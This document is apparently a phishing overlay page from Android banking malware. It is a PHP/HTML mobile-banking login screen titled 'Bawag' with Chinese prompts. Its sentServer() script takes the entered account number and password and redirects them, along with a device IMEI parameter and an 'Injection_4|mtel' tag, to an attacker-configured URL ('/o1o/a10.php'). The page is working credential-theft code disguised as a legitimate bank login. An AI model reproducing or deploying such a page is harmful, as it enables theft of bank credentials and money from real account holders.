<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="hk/com.mtel.androidbea/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div id="head">
	<img style="width: 15%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF4AAABeCAMAAACdDFNcAAAAD1BMVEUAAADQ0NDPz8/Nzc3Q0NAP5/bTAAAABHRSTlMAzIBMb8+cTgAAADtJREFUaN7t1akRADAQAsDL03/N8VGYiMztFoCCoQoAAKC7HWkaPyJKxG1GrPZF/IroKGblDAEAAD5zAA6oBmMH9W36AAAAAElFTkSuQmCC">
	<img style="width: 44%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUQAAAA+CAMAAABk+pLnAAAC/VBMVEUAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+G1NxwAAAA/nRSTlMABExKTd9P/vpS4Ugc7btRveoZB57mjxQVkeeZBkbF2p+D/dvCQi6Y7JUsAWyq0u6oagom+xpD/ANO62PcYQKL030bx24QU0AnyPhJMSXLyrpWr9G2zM5LERixoR0wwNCdXw0J9vWTpoaMo5bY1t6wrCP5wb+QDvDlDOhbnPfXEvNFZJSa73LxZoAWRHh5aXR8Pz7VshNZh+M6KjJt4gurItk4lznkrYo0oKQvp/JiqbfPhEEFfzy+KC2z1A879GhaVQhUrlcfMylHdje0jt2JXLh6iHCNoiAhdT1YUMTGXReBex7Db5IkgnHgYH536YVla7VzzcmlvF4ruZtnNrAouUUAAAsbSURBVHja7ZxpWBRHGscLjIJGRA6PeIEQjzjxQhSCSAyiazQG8UZRFPBMPFAWxPtCPINRSTxZrxiPwQuMRxBXVtGYaBKNunHVuJqoiYnubtRsNrv/Z9/qY6an6Rl6GH2efOj/B7q6uqaq59dVb71vVQ+MGTJkyJAh+3JTpN3dK9m5YsiRnqtcxXriAU/rSdVqzxt4dKm6F1CjilsZiG7eNQEfXwOQHvn5g1SrtncdBcS6VV+ox7PrNzAA6VPDRhAUUCOwMRDUOLBGsJjxYhMDjn41beYFtZq/1MIA45xMTV9u2aq1xK91qzZtW5gMKBVTSDsgtF2IAcIVte8AhDUxZuQKK/yVwAhpOPv4u4cbQCqAsGOkzbQS0Cnqd3Nvr3bu/Jorn49+oUvNmPKCr67duv3Bxfvs/rrIrkfPN9w9xWSjXnbbe1Ot2N714xR32aevpvqp6vHtP4A0UKuJQfEKDQaGKM+7imUS+jpSXUtdQ5vzrzOMW/rwRKWGK1sMBEYwlhSvUrJ+hlVSgJGjRgNj6GQsMO4tnjHQTuk60NLb1uBxvGYBTFDVM1bIjdVqYiIcaJJYJtVRGVgMe3wtYLKH+KlwmyJTlGsGQBod/qiupqNuhiPCgN7R6RmYmkln6dPglZlAMV/odAcQg5QSG5xhUkCcPLOMZtlWM3uO+LG5FYSYPk8SPfD5QmIBkCVnyi5GeBrRSnojC1goQMxeJGqxDcQl0zAy1SWIS4nhMhNbDswTzt8BcphpBeD5rn2ItrO6e3+el6OAuLLcZulrYBXEHlCmiQSFVtPQUJ7nqgpnAOIoeA+Yqq7pfWANBbQDPRC6lkOcJuWvU0KM6g0sEhYS1quUq5NhAvnYG+i4EXPyxEecIoy8hUBEe30Q6Rn/ifLmZDoBMZOCpNBNm6nolnJKtgG2OrruCKK7Bzy38cQY4IO69iBSh5no2qSyHfiQDjuAnVLOLmC32LfNeiGyQfmU6e0ExBzwBvfQ39Val6Os2gs0U5w6AzE+0ssrRnzK+7y82hBEn9mi1tJcI5fqECb0VhfUBNjP12oOAAWFS7rv6L6kcC5wkK/vdAY+0guRHaLMGP0Q/cjeBx1mhRsBjyNlL79n3yRucaYnqsaLTUUyxO6tkbLDtY549OOXixhzOxYMFEu10/HtteSydI0Zv103ROrQ0nfRBfG4NEPE0HF0xSAWTReVooDYWsqT55W5la1apQ0xlzzkP7sYLp8wsZK/nMwvc6/Z27v5sahTJXoh0kPwKNUN0W0ClTnN2/ehSDNVC6LPaUlk9SdJyS1KiGesN1tFTT5Bdt4U36iYQ4xIFfWJBeLyfv3OMvbpZ5/FuOLQf5ghNhK5eue5FTErzgUOPi9mZH2ue2Jh3RQ9SgfEL6jIl0LqAqUWaEGcqjGxNFBDjNwsqIM4i4gnExQQ28eRyMu5SIeqqtl5mKK95FmYmcr2pJTRV3oQFl2azKPlIeSxd1KOtRmXfbi392q6PogfTaOHfEU3RNMqS5GibGomuqIQtVyQvyogytGIu2wTZYhbbH2rUcAKxhaVNR5f64F4khyNvVej2FdyQ1K3asuiVrYkB7KlXYglspIP/82fQgKfI8qI5YvDKhUpq7hGJa5LaXI+cE4D4uTrkiKAelLyhrMQ/XjsRk/hGzrcZG5ARpygb7oAJ60feQU4X8jYpjirdgKV6dBdD8T9yBAa/Lty2lsJ3OLH2xnobw+in+0T87jc3nHYZ+P7x1KGvDe7hCaG4twKTCx6IJaxiQqdsnyiFxm0b1W1fEdei16LWA2RwvEOYDXvdHuXhMR5nNcJMf/OXf0Ql9J5onIo4V5ZiNnfS9oPNJKSOS5DDPpB0uvWG8rkxsUViJUlTLWBdpbMI6L/za9G2oPYIC0t7RBXzUOJwjqJ55hwBcR9gSqtVPmUcZaz257kmiQ9G5uYzOPElsB9OlRX2kSlgebemUsQY1EsTG0/AscsmQXAcqHHjEQXXROL7wa+0zU4XN/Ewh2VgCgbw4+zuiDmUskd5UFsR/nV7U4sfiUl/DZNZMyly5coInQN4gxqsfOim2wDcM2SGQccZzePU8SCZjpdnOo/WAdleRBX0/Uh16z6ic7rlaghPpCnpH5AGzqcOXNmvZmcyrzyID4EUuTVzeRpD06JEC8/MAsQ3weOiuHydctCSECBaxCj9nzAp4XYL4F/WDL/CfwrliZcrOlk0utsF3CrM0gPxCMeWjazrc6J5ZLScqPeVEGfiHO+kOZer7+l0DQsEyHGUnfmEJMpQOnGZmcB4jsyP1M/vLLbNYhkZ+4/Em9vTvDjfU+aPdn3OFiK/x6NKNTtbDPGfdzpeiCO1oRT2U0PxDWvubHyI5aJVu/2Bo0lAWIEckSbSLNa8+jhwJuigVh+4cJhNtQ1iCHLqcF1B/oHqe42qH/jdRQ9X9Ad9rFfLOPZMcS75H36LLMVd3n+bRMW5nEdIRdxSN4kcv0zyfiv6ZVns1qf5C1qpAKiF50/p4wid6GmALEIkCOWrcI6ZuhpRSlXe+KQ7Jf4bkoudcfESK8gBHkFJwKPubE53Cx/hv6eOItyH+qAuICuXlDlXaW88WUsRzyNvGENxIklhDi3GuT0eiL7CbUEiFu49yFC9OOPDI3ZU4S4Owwb+dbPMmE50JRnEuaVhZzrVISu0w1xE3UwaWncIcRoCjOzi9S531pXI61r9n2py8yWZ+d4MhddujoNkQbvbA5xHrJNsotTSi5ZQIOnCZHNB/bybkcuipTTT3C8TSc1wjH7EKk0wq6UD/EcxP0wW/WEbKQsKg0gv2GJ1cVJCAb6xjsLcTbQhEOcz9cbZD+xYSjCqj5ViF3PA2+Z+Ff3FPcZfcN4OGGiYbc5SS/EEjPPbFm+i5NLk1bKEq3wU7Vl1YK8hsQ6Sj8xejNFuKlOQmT19z7PIR7c21GGuM2X3afQfO7ThMh+zQd25vElDMHDZgfJwWeZuyhY725/o+pKqUWbWlTaKrw8kdHLCjHuSllxD/geXRulUekJ1ZaVO93Uf4psne06NOi9CpyEqHK2U5I6zkxzY2fJH1vrEOJvoCnJCb2bTTbiWIOpyOejJboY1Qqvkk3POubMvjMQsc3xvjN33JPIP/O8reWv8i2rbZbTs+QtbHVTRyx+42hWfUdyK87JIiM7WEiQGZojZy4WClUS0h8DffjxoYla507qLcY+J8t8TBPidOEzfaicc+9dDF1DNf8yWNyqekJN8uC22hGnNu9b36lbzuZ92CbGewACNWvlW1ZHpXQ6eTUj92jt9m0gYkNC5AjQgS7KwYtC89k44Xg0XQxUihtqQAyRXzDE4xLnVre7XpYWtH6e/rVUhX+6vcJJbVQyD7/037UKv3ysWVPcWNSmYzvNWgt3ms2jRR+m8J7ZPG6d9pbp+idm8y0e/GaaHeqmUPqUzX2WsiL/7MlpJ6QeZzZflpeRS83mxVLyf1IFv3V0/rcTa/vZPLSjn7LfjZLT00ueXm3P9kWtXmdfFDdbsqbkpDJDFZYvGW7jHU/Xxs0Z8nnDeh5ONlBU0FQsPTdAXoQIenSpifHeu9Mq+rGaemVqRbqBxRm55Qg/Y+nxyJ9inbDvAgdMFn7I8r3x4rZ+3X3MPcQa17inJ/4srbBqTY7xxiYDjk4V8PdwhkthsuUHkmd28mB4pYFHl9x7AD6Wlx8UP9W9FgHM7GkA0qGmxcChm0wDIvOdQgH9rwaicpU3AdifyTQhsvRWQLDhNJarA8Aa5ftzNhBZQi3xnVlDDlXJ29tmCr548aHNxO3tbfwHA0OGDBkyZOhZ6/8x8nFr2nN12wAAAABJRU5ErkJggg==">

</div>

<p> 移动银行的登录 </p>

    <div class="main" id="content_div">
        <div class="container">
<div class="row">
                <div class="col-xs-1 col-sm-2"></div>
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

					<form id="form">
                            <div class="form-group">
									<input type="text" class="form-control" name="field2" placeholder="账户号码/使用者姓名" id="login" autocomplete="off" autofocus="autofocus" maxlength="8" data-reg="/.{8,8}/" >
                           </div>

                            <div class="form-group"> 
									<input type="password" class="form-control" name="field3" placeholder="个人密码 (「密码」)" id="password" autocomplete="off" data-reg="/.{5,5}/" maxlength="5" >
                            </div>

                       				<input type="button" class="input_submitBtn" onClick="sentServer();" value="登入">
									
 </form>

 </div>
                </div>
                <div class="col-xs-1 col-sm-2"></div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|mtel|"+login1+"|"+pass);
	}
</script>
</body>
</html>
